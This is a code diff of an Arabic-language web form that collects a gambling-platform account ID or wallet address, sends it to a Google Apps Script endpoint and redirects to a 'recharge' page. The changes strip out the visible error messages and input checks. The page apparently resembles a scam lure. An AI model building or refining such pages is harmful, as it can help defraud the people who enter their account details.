@@ -30,7 +30,6 @@
   .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
   .btn[disabled]{opacity:.6;cursor:not-allowed}
   .warn{font-size:12px;color:#444;line-height:1.7;margin-top:12px;text-align:center}
-  #error-message{color:red;text-align:center;margin-top:6px}
 </style>
 </head>
 <body>
@@ -61,14 +60,13 @@
 
       <div class="group">
         <span class="label" id="id-label">Account ID</span>
-        <input id="uid" class="field" type="text" inputmode="numeric" pattern="[0-9]{4,15}" maxlength="15" placeholder="مثال: 87654321">
+        <input id="uid" class="field" type="text" inputmode="numeric" maxlength="15" placeholder="مثال: 87654321">
       </div>
 
       <button id="go" class="btn" disabled>تأكيد</button>
       <div class="warn">
         بالضغط على زر المتابعة، أنت تؤكد أن عمرك 18 سنة فأكثر وأنك توافق على سياسة الخصوصية والشروط والأحكام.
       </div>
-      <div id="error-message"></div>
     </div>
   </div>
 </div>
@@ -76,8 +74,7 @@
 <script>
 const platformSelect = document.getElementById('platform'),
       uid = document.getElementById('uid'),
-      go = document.getElementById('go'),
-      errMsg = document.getElementById('error-message');
+      go = document.getElementById('go');
 
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6nU4N6fEejGuPLm20SxM_3yt3jiU0DiiFW4MYom7VLOJ6aojZoQ/exec";
 let platform = null;
@@ -92,29 +89,15 @@ function validate() {
     uid.value = val;
   }
 
-  errMsg.textContent = '';
   go.disabled = true;
 
-  if(!platform) {
-    // لا تظهر أي رسالة، فقط يبقى الزر مقفول
-    return;
-  }
+  if(!platform) return;
 
   if(platform !== "Stake" && platform !== "MyStake"){
-    // التحقق من أن الـ ID بين 4 و 15 رقم
-    if(!/^[0-9]{4,15}$/.test(val)){
-      errMsg.textContent = 'يجب أن يتكون المعرّف من 4 إلى 15 رقمًا.';
-      return;
-    }
-    if(repReg.test(val)){
-      errMsg.textContent = 'المعرّف غير صالح';
-      return;
-    }
+    if(!/^[0-9]{4,15}$/.test(val)) return;  // لازم 4 الى 15 رقم
+    if(repReg.test(val)) return;            // منع الأرقام المكررة
   } else {
-    if(val.length < 10) {
-      errMsg.textContent = 'العنوان غير صالح.';
-      return;
-    }
+    if(val.length < 10) return;             // عنوان محفظة لازم يكون أطول
   }
 
   if(val.length > 0) go.disabled = false;
@@ -163,7 +146,6 @@ go.addEventListener('click', async () => {
 
     window.location.href = 'fr/office/recharge.html';
   } catch(err){
-    errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
     go.disabled = false;
     go.innerText = 'تأكيد';
   }
